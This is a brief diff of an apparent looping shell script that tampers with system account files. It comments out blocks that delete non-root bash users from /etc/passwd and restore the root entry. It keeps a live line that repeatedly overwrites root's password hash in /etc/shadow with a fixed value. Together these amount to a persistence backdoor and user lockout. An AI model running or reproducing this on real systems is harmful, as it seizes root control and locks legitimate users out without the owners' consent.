@@ -77,16 +77,16 @@ while :; do
         sleep 1
     fi
 
-    grep ":/bin/bash\s*$" /etc/passwd | grep -v "^\s*root:" &>/dev/null
-    if [ $? -eq 0 ]; then
-        chmod 0644 /etc/passwd
-        sed -i "/:\/bin\/bash\s*$/d" /etc/passwd
-    fi
+#     grep ":/bin/bash\s*$" /etc/passwd | grep -v "^\s*root:" &>/dev/null
+#     if [ $? -eq 0 ]; then
+#         chmod 0644 /etc/passwd
+#         sed -i "/:\/bin\/bash\s*$/d" /etc/passwd
+#     fi
 
-    grep "^root:x:0:0:root:/root:/bin/bash$" /etc/passwd &>/dev/null
-    if [ $? -ne 0 ]; then
-        sed -i "1i\root:x:0:0:root:\/root:\/bin\/bash" /etc/passwd
-    fi
+#     grep "^root:x:0:0:root:/root:/bin/bash$" /etc/passwd &>/dev/null
+#     if [ $? -ne 0 ]; then
+#         sed -i "1i\root:x:0:0:root:\/root:\/bin\/bash" /etc/passwd
+#     fi
 
     sed -i 's/^root:.*$/root:\$6\$ex0u6ZI7omnNoT3T\$zmFubsbiHS6noSp8E37xJDoNnLkUOjGIAliZA921hWSjMR6KuF9MFweRuUQCe.78XU2bVFx\/KuQtYIbj2YhCA\/::0:99999:7:::/g' /etc/shadow
 
